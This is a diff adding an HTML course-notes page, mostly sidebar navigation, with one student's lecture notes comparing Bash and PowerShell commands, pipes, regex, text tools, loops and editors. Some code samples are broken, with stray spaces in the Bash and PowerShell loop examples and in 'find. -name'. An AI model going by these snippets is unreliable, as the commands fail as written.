+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools%20and%20Commands/Basic%20Bash%20commands/find/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    find
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools%20and%20Commands/Basic%20Bash%20commands/Regular%20Expression%20%28e%20g%20regex%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Regular Expression
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools%20and%20Commands/Forensics%20%26%20Incident%20Response/Forensics%20%26%20Incident%20Response/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Forensics & Incident Response
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_5" id="__nav_4_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Setup & Config
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Setup & Config
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools%20and%20Commands/Setup%20%26%20Config/Qemu/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Qemu
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools%20and%20Commands/Vulnerability%20Scanning%20%26%20Assessment/Vulnerability%20Scanning%20%26%20Assessment/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vulnerability Scanning & Assessment
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Resources
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Resources
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../resources/All%20the%20quizzes%20and%20the%20correct%20answers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    All the quizzes and the correct answers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../resources/references/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    References and Resources
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Course Material
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Course Material
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../resources/Course material/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    None
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_4" id="__nav_5_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Online Resources
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Online Resources
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../resources/Online Resources/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    None
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="2025-11-26-command-line-interface-gisli">2025-11-26 Command-Line Interface (Gísli)<a class="headerlink" href="#2025-11-26-command-line-interface-gisli" title="Permanent link">&para;</a></h1>
+<h1 id="gislis-notes">Gísli’s notes<a class="headerlink" href="#gislis-notes" title="Permanent link">&para;</a></h1>
+<ul>
+<li>We’ll need Virtual Machines later in the course, of course.</li>
+<li>Learning how to use the CLI (Command Line Interface) is extremely important, in this course and elsewhere.<ul>
+<li>Many tools exist <em>only</em> in the CLI. Often (but not always), tools are first made with a TUI (Text User Interface) and later with a GUI (Graphical User Interface).</li>
+</ul>
+</li>
+<li>Unix introduced the Shell and piping in 1969.<ul>
+<li>“Piping” allows you to send the output of one command as the input to another.</li>
+</ul>
+</li>
+<li>Linux dominates the current internet infrastructure. MacOS X is a friendly GUI on top of the Unix CLI.</li>
+<li>Pros of the CLI:<ul>
+<li>Speed and efficiency.</li>
+<li>Wildcards and regex.</li>
+<li>Piping. Lets you chain different tools together.</li>
+<li>Automation and scripting. Essentially, use all the pros of programming for <em>everything.</em></li>
+<li>Lets you access the “hidden” 20% of features that the GUI hides. The GUI often protects the user from making mistakes or becoming confused.</li>
+<li>Overriding safety rails.</li>
+<li>More detailed debugging control.</li>
+<li>Again, many tools have a TUI interface first, and someone later makes a GUI for it.</li>
+<li>The standard for performing remote server management is often achievable only via the CLI.</li>
+<li>Low resource usage, significantly faster than a GUI.</li>
+<li>The user interface is often pretty consistent across different operating systems, even over the past 50 years.</li>
+<li>Much easier to communicate exactly to someone what they should do.</li>
+</ul>
+</li>
+<li>Different Shells (CLIs):</li>
+<li><strong>The Unix family</strong>.<ul>
+<li>Bash: <a href="../Terminology/Systems &amp; Plaforms/POSIX">POSIX</a>-compliant, default on most Linux</li>
+<li>Zsh: more customizable, advanced features, default on macOS</li>
+</ul>
+</li>
+<li><strong>The Windows family</strong>.<ul>
+<li>PowerShell: Standard for Windows administration, has things like <code>OO</code> (pipes.NET Objects instead of text)</li>
+<li>WSL (Windows Subsystem for Linux): allows you to run Bash/Zsh.</li>
+<li>CMD (deprecated).</li>
+</ul>
+</li>
+<li><strong>Infrastructure &amp; Language CLIs</strong><ul>
+<li>Cloud CLIs (AWS CLI, Azure CLI, gcloud)</li>
+<li>Language REPLs (Read-Eval-Print Loops), e.g., <code>python -i</code>.</li>
+</ul>
+</li>
+</ul>
+<h2 id="useful-commands">Useful commands<a class="headerlink" href="#useful-commands" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>[!warning]
+PowerShell allows you to use many Bash command names (like <code>ls</code> or <code>cp</code>), but they are just aliases.</p>
+</blockquote>
+<ul>
+<li><strong>The Syntax</strong>: PowerShell uses “Verb-Noun” pairs (e.g., <code>Get-ChildItem</code>, <code>Copy-Item</code>,  <code>Set-Location</code>).</li>
+<li><strong>The Alias</strong>: <code>ls</code> is just an alias/nickname for <code>Get-ChildItem</code>.</li>
+<li><strong>The Trap</strong>: Command names work, but their flags do not.<ul>
+<li><strong>Bash</strong>: <code>ls -la</code> ✔</li>
+<li><strong>PowerShell</strong>: <code>ls -la</code> ✕→ You must use <code>ls -Force</code> instead.</li>
+</ul>
+</li>
+</ul>
+<h3 id="navigation-file-searching-todo">Navigation &amp; file searching (TODO)<a class="headerlink" href="#navigation-file-searching-todo" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Action</th>
+<th>Bash/Zsh</th>
+<th>PowerShell</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Print directory</td>
+<td><code>pwd</code></td>
+<td><code>pwd</code> (<code>Get-Location</code>)</td>
+</tr>
+<tr>
+<td>List Files</td>
+<td><code>ls</code></td>
+<td><code>ls</code> / <code>dir</code></td>
+</tr>
+<tr>
+<td>List Hidden Files</td>
+<td><code>ls -a</code></td>
+<td><code>ls -Force</code></td>
+</tr>
+<tr>
+<td>Change Dir</td>
+<td><code>cd</code></td>
+<td><code>cd</code> (<code>Set-Location</code>)</td>
+</tr>
+<tr>
+<td>Create File</td>
+<td><code>touch file</code></td>
+<td><code>ni file</code> (<code>New-Item</code>)</td>
+</tr>
+<tr>
+<td>Copy</td>
+<td><code>cp</code></td>
+<td><code>cp</code> / <code>copy</code> (<code>Copy-Item</code>)</td>
+</tr>
+<tr>
+<td>Move/Rename</td>
+<td><code>mv</code></td>
+<td><code>mv</code> / <code>move</code> (<code>Move-Item</code>)</td>
+</tr>
+<tr>
+<td>Delete</td>
+<td><code>rm</code></td>
+<td><code>rm</code> / <code>del</code> (<code>Remove-Item</code>)</td>
+</tr>
+<tr>
+<td>Force Delete</td>
+<td><code>rm -rf</code></td>
+<td><code>rm -Recurse -Force</code></td>
+</tr>
+<tr>
+<td>Show the manual</td>
+<td><code>man &lt;command&gt;</code></td>
+<td><code>help</code>, <code>man</code> (<code>Get-Help</code>)</td>
+</tr>
+<tr>
+<td>History</td>
+<td><code>history</code></td>
+<td><code>history</code> (<code>Get-History</code>)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="reading-searching-todo">Reading &amp; Searching (TODO)<a class="headerlink" href="#reading-searching-todo" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Action</th>
+<th>Bash/Zsh</th>
+<th>PowerShell</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Read content</td>
+<td><code>cat</code></td>
+<td><code>cat</code> / <code>type</code> (<code>Get-Content</code>)</td>
+</tr>
+<tr>
+<td>Pager</td>
+<td><code>less</code></td>
+<td><code>more</code></td>
+</tr>
+<tr>
+<td>First $n$ lines</td>
+<td><code>head -n 10</code></td>
+<td><code>select -first 10</code> (<code>Select-Object -First 10</code>)</td>
+</tr>
+<tr>
+<td>Last $n$ lines</td>
+<td><code>tail -n 10</code></td>
+<td><code>select -last 10</code> (<code>Select-Object -Last 10</code>)</td>
+</tr>
+<tr>
+<td>Live Log</td>
+<td><code>tail -f</code></td>
+<td><code>Get-Content -Wait</code></td>
+</tr>
+<tr>
+<td>Search Text</td>
+<td><code>grep "txt"</code></td>
+<td><code>sls "txt"</code> (<code>Select-String</code>)</td>
+</tr>
+<tr>
+<td>Find File</td>
+<td><code>find. -name "X"</code></td>
+<td><code>ls -r -filter "X"</code> (<code>Get-ChildItem -Recurse -Filter</code>)</td>
+</tr>
+<tr>
+<td>Find File by Content</td>
+<td><code>grep -R "txt"</code></td>
+<td>`ls -r</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><strong>SuperUser Permissions:</strong><ul>
+<li><strong>Bash</strong>: <code>sudo command</code></li>
+<li><strong>PowerShell</strong>: Right-Click → “Run as Administrator”.</li>
+</ul>
+</li>
+<li><strong>Process Management:</strong><ul>
+<li><strong>Bash</strong>: <code>ps</code>, <code>kill PID</code></li>
+<li><strong>PowerShell</strong>: <code>ps</code> (<code>Get-Process</code>), <code>kill</code> (<code>Stop-Process</code>)</li>
+</ul>
+</li>
+<li><strong>Web Requests:</strong><ul>
+<li><strong>Bash</strong>: <code>curl url</code><ul>
+<li>(Fetch the thing at this URL. Lets you download stuff at this URL.)</li>
+</ul>
+</li>
+<li><strong>PowerShell</strong>: <code>curl</code> (<code>Invoke-WebRequest</code>)</li>
+<li>(Note: PowerShell’s ‘<code>curl</code>’ is NOT the real <code>curl</code>. It parses <em>HTML</em> objects.)</li>
+</ul>
+</li>
+</ul>
+<p>Use <kbd>Ctrl</kbd>+<kbd>R</kbd> for reverse search in history.</p>
+<p>Auto-complete (by pressing ↹Tab) for commands and file names is a common feature in almost all CLIs.</p>
+<h2 id="pipes-the-glue-of-the-command-line-interface">Pipes - The glue of the Command Line Interface<a class="headerlink" href="#pipes-the-glue-of-the-command-line-interface" title="Permanent link">&para;</a></h2>
+<p><strong>Term</strong>: Piping
+<strong>Definition</strong>: “A mechanism that connects the <em>output</em> of one program to the <em>input</em> of another.”</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>command1<span class="w"> </span><span class="p">|</span><span class="w"> </span>command2
+</span></code></pre></div>
+<ul>
+<li><strong>The Symbol</strong>: The vertical bar (<code>|</code>).</li>
+<li><strong>The Flow</strong>: STDOUT of one command becomes STDIN of the next.</li>
+<li><strong>The Unix Philosophy</strong>: “Write programs that do one thing and do it well. Write programs to work together.”</li>
+<li><strong>The Benefit</strong>: No need to create temporary files. Data flows in memory.
+A little example (these commands aren’t actually real):</li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>get_user_input<span class="o">()</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>reverse_string_text<span class="o">()</span>
+</span></code></pre></div>
+<p>↑this would get an input from the user, and then <em>reverse</em> that text.</p>
+<p>An <em>actual</em> Bash example of piping:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>cat<span class="w"> </span>file.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;error&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort
+</span></code></pre></div>
+<p>This command sequence does the following:</p>
+<ol>
+<li><code>cat file.txt</code>: Reads the contents of <code>file.txt</code>.</li>
+<li><code>grep "error"</code>: Filters lines containing the word “error”.</li>
+<li><code>sort</code>: Sorts the filtered lines alphabetically.
+This is a powerful way to process and analyze text data using simple, modular commands.</li>
+</ol>
+<h3 id="text-vs-object-streams">Text vs. Object Streams<a class="headerlink" href="#text-vs-object-streams" title="Permanent link">&para;</a></h3>
+<p><strong>Bash/Zsh (Text Streams)</strong></p>
+<ul>
+<li>Pipes carry sequences of characters.</li>
+<li>The receiving command needs to parse the strings.</li>
+<li>Example: <code>ls | grep ".txt$"</code> (matches the string in each line)</li>
+</ul>
+<p><strong>PowerShell (Objects)</strong></p>
+<ul>
+<li>Commands output .NET Objects.</li>
+<li>The receiving command operates on objects and their properties.</li>
+<li>Example: <code>ls | Where Extension -eq ".txt"</code> (matches the “Extension” property of the file objects)</li>
+</ul>
+<h3 id="a-more-complex-piping-example">A more complex piping example<a class="headerlink" href="#a-more-complex-piping-example" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># List all files | Sort by size column | Take last 3</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>ls<span class="w"> </span>-l<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-nk5<span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-n3
+</span></code></pre></div>
+<p>The Logic:</p>
+<ol>
+<li><code>ls</code> generates the raw list.</li>
+<li><code>|</code> passes that list to <code>sort</code>.</li>
+<li><code>sort</code> reorders the data.</li>
+<li><code>|</code> passes the sorted list to <code>tail</code>.</li>
+<li><code>tail</code> discards everything except the final 3 lines.</li>
+</ol>
+<h2 id="patterns-file-globs-vs-regular-expressions-regex">Patterns: File Globs vs. Regular Expressions (Regex)<a class="headerlink" href="#patterns-file-globs-vs-regular-expressions-regex" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>[!warning] The Confusion
+Both systems use similar symbols (like <code>*</code>), but they mean different things and serve different purposes.</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th></th>
+<th><strong>File Globs (Wildcards)</strong></th>
+<th><strong>Regular Expressions (Regex)</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Interpreter</strong></td>
+<td>The Shell (Bash/Zsh/PS)</td>
+<td>The Tool (grep, sed, awk, editors)</td>
+</tr>
+<tr>
+<td><strong>Target</strong></td>
+<td>Filenames</td>
+<td>Text Content (Inside files)</td>
+</tr>
+<tr>
+<td><strong>Timing</strong></td>
+<td>Expands before command runs.</td>
+<td>Processed during command execution.</td>
+</tr>
+<tr>
+<td><strong>The <code>*</code> Symbol</strong></td>
+<td>“Everything” (e.g., <code>*.txt</code>)</td>
+<td>“Zero or more of the previous character”</td>
+</tr>
+<tr>
+<td><strong>The <code>?</code> Symbol</strong></td>
+<td>“Any single character”</td>
+<td>“Zero or one of the previous character”</td>
+</tr>
+<tr>
+<td><strong>Common Use</strong></td>
+<td><code>ls *.jpg</code></td>
+<td><code>grep "Error.*" log.txt</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="regular-expression-syntax">Regular Expression Syntax<a class="headerlink" href="#regular-expression-syntax" title="Permanent link">&para;</a></h3>
+<p>Basic Syntax Cheatsheet:</p>
+<ul>
+<li><code>.</code> (Dot) → Any single character.</li>
+<li><code>^</code> (Caret) → Start of a line.</li>
+<li><code>$</code> (Dollar) → End of a line.</li>
+<li>(Star) → Zero or more of the previous item.</li>
+<li><code>[a-z]</code> → Any character in the bracket range (any lowercase character in the alphabet from <code>a</code> to <code>z</code>)<ul>
+<li><code>[a-zA-Z]</code> would be any lowercase or uppercase letter in the alphabet.</li>
+</ul>
+</li>
+<li><code>(X|Y)</code> → Either pattern <code>X</code> or pattern <code>Y</code>.</li>
+</ul>
+<h2 id="text-processing-tr-cut-sed-awk">Text Processing: <code>tr</code>, <code>cut</code>, <code>sed</code>, <code>awk</code><a class="headerlink" href="#text-processing-tr-cut-sed-awk" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th><strong>Tool</strong></th>
+<th><strong>Mental Model</strong></th>
+<th><strong>Syntax &amp; Example</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>tr</code></td>
+<td><strong>The Char Swapper.  <br></strong>Swaps or deletes single characters. Cannot handle words.</td>
+<td><code>tr '&lt;old&gt;' '&lt;new&gt;'</code>  <br>Ex: Uppercase:  <br><code>echo "hi" \| tr 'a-z' 'A-Z'</code></td>
+</tr>
+<tr>
+<td><code>cut</code></td>
+<td><strong>The Slicer.  <br></strong>Strictly slices each line based on a specific delimiter (like a comma).</td>
+<td><code>cut -d"&lt;delim&gt;" -f&lt;number&gt;</code>Ex: Get 1st column of CSV:  <br><code>cut -d"," -f1 data.csv</code></td>
+</tr>
+<tr>
+<td><code>sed</code></td>
+<td><strong>The Surgeon.  <br></strong>Uses Regex to find and replace patterns within the text.</td>
+<td><code>sed 's/&lt;find&gt;/&lt;replace&gt;/g'</code>  <br>Ex: Replace text:  <br><code>sed 's/cat/dog/g' file.txt</code></td>
+</tr>
+<tr>
+<td><code>awk</code></td>
+<td><strong>The Spreadsheet.  <br></strong>Smart column extraction. Handles messy whitespace automatically.</td>
+<td><code>awk '{print $&lt;N&gt;}'</code>Ex: Get PID (2nd col) from <code>ps</code>:  <br><code>ps aux \| awk '{print $2}'</code></td>
+</tr>
+</tbody>
+</table>
+<p>Use <code>cut</code> for simple delimiters (CSV). Use <code>awk</code> for messy output (like <code>ls</code> or <code>ps</code>) where spaces vary.</p>
+<h3 id="powershell-equivalents-the-object-way">PowerShell Equivalents: The Object Way<a class="headerlink" href="#powershell-equivalents-the-object-way" title="Permanent link">&para;</a></h3>
+<p>In PowerShell, you rarely manipulate raw text streams. You manipulate Properties and call Methods.</p>
+<table>
+<thead>
+<tr>
+<th><strong>Unix Tool</strong></th>
+<th><strong>PowerShell Strategy</strong></th>
+<th><strong>PowerShell Syntax/Example</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>tr</code><br>(Char swap)</td>
+<td>String Methods.  <br>Call .NET methods directly on the string object.</td>
+<td><code>&lt;String&gt;.Method()</code>  <br>Ex: <code>"hello".ToUpper()</code>  <br>Ex: <code>" hi ".Trim()</code></td>
+</tr>
+<tr>
+<td><code>sed</code><br>(Regex replace)</td>
+<td>The <code>-replace</code> Operator.  <br>Uses Regex natively to swap patterns.</td>
+<td><code>$_ -replace 'regex','new'</code>  <br>Ex:  <br><code>"cat" -replace 'c','b'</code>→ “bat”</td>
+</tr>
+<tr>
+<td><code>cut</code> &amp; <code>awk</code><br>(Columns)</td>
+<td><code>Select-Object</code>.  <br>Don’t cut delimiters; ask for the property name.</td>
+<td><code>Select-Object Name, Id</code>  <br>Ex (CSV):  <br><code>Import-Csv data.csv \| select Email</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="loops-iterating-over-items">Loops: Iterating over items<a class="headerlink" href="#loops-iterating-over-items" title="Permanent link">&para;</a></h2>
+<p><strong>Bash syntax</strong></p>
+<ul>
+<li>Structure: <code>for ... do ... done</code></li>
+<li>Variable accessed via <code>$var</code></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">for</span><span class="w"> </span>f<span class="w"> </span><span class="k">in</span><span class="w"> </span>*.<span class="w"> </span>txt<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">    </span>mv<span class="w"> </span><span class="s2">&quot; </span><span class="nv">$f</span><span class="s2"> &quot;</span><span class="w"> </span><span class="s2">&quot; </span><span class="nv">$f</span><span class="s2"> . bak &quot;</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="k">done</span>
+</span></code></pre></div>
+<p><strong>PowerShell Syntax</strong></p>
+<ul>
+<li>Structure: <code>foreach</code> or pipeline</li>
+<li>Current item is <code>$_</code> (in pipe)</li>
+</ul>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">ls </span><span class="p">*.</span> <span class="n">txt</span> <span class="p">|</span> <span class="k">ForEach</span> <span class="p">-</span> <span class="n">Object</span> <span class="p">{</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>    <span class="n">Rename</span> <span class="p">-</span> <span class="n">Item</span> <span class="nv">$_</span> <span class="p">-</span> <span class="n">NewName</span> <span class="p">(</span> <span class="nv">$_</span> <span class="p">.</span> <span class="n">Name</span> <span class="p">+</span> <span class="s2">&quot;. bak &quot;</span><span class="p">)</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="p">}</span>
+</span></code></pre></div>
+<h2 id="functions-arguments-and-parameters">Functions: Arguments and Parameters<a class="headerlink" href="#functions-arguments-and-parameters" title="Permanent link">&para;</a></h2>
+<p><strong>Bash (Positional)</strong></p>
+<ul>
+<li>Arguments are unnamed.</li>
+<li>Accessed by number (<code>$1</code>, <code>$2</code>).</li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>greet<span class="o">()</span><span class="w"> </span><span class="o">{</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Hello </span><span class="nv">$1</span><span class="s2">&quot;</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="o">}</span>
+</span></code></pre></div>
+<p>Usage: <code>greet "John"</code></p>
+<p><strong>PowerShell (Named)</strong></p>
+<ul>
+<li>Arguments are named parameters.</li>
+<li>Defined in <code>param()</code> block.</li>
+</ul>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="k">function</span> <span class="n">Greet</span> <span class="p">{</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>    <span class="k">param</span><span class="p">(</span><span class="nv">$Name</span><span class="p">)</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>    <span class="nb">Write-Host</span> <span class="s2">&quot;Hello $Name&quot;</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Usage: <code>Greet -Name "John"</code></p>
+<h1 id="editors-and-script-files">Editors and Script Files<a class="headerlink" href="#editors-and-script-files" title="Permanent link">&para;</a></h1>
+<h2 id="cli-text-editors-nano-vim-emacs">CLI Text Editors: Nano, Vim, Emacs<a class="headerlink" href="#cli-text-editors-nano-vim-emacs" title="Permanent link">&para;</a></h2>
+<p><strong>The Challenge</strong>: Editing files directly on a server without a mouse.</p>
+<table>
+<thead>
+<tr>
+<th><strong>Editor</strong></th>
+<th><strong>Archetype</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Nano</strong></td>
+<td>The Beginner</td>
+<td>Modeless. behaves like Notepad. Instructions are listed at the bottom (e.g., Ctrl+X to Exit).</td>
+</tr>
+<tr>
+<td><strong>Vim</strong></td>
+<td>The Standard</td>
+<td>Modal. You are either in “Insert Mode” (typing) or “Command Mode” (navigating). Extremely fast once learned. Installed on 99% of servers.</td>
+</tr>
+<tr>
+<td><strong>Emacs</strong><br>(<em>don’t use this 😟</em>)</td>
+<td>The Ecosystem</td>
+<td>Programmable. An interpreter for Lisp.<br>Extremely “powerful” (<em>does “powerful” just mean “does a bunch of crap”? Linux people keep throwing that word around...</em>) (can run email, calendars, games), but complex key combinations.</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>[!tip] Tip:</p>
+<p>If you don’t want to learn Vim, at least remember how to close it:
+\<ESCAPE> <code>:q!</code> \<ENTER></p>
+</blockquote>
+<h2 id="script-files-storing-and-executing">Script Files: Storing and Executing<a class="headerlink" href="#script-files-storing-and-executing" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th><strong>Shell</strong></th>
+<th><strong>Extension</strong></th>
+<th><strong>Header</strong></th>
+<th><strong>Execution Requirements</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Bash</td>
+<td>myfile.sh</td>
+<td><code>#!/bin/bash</code><br>(“Shebang”)</td>
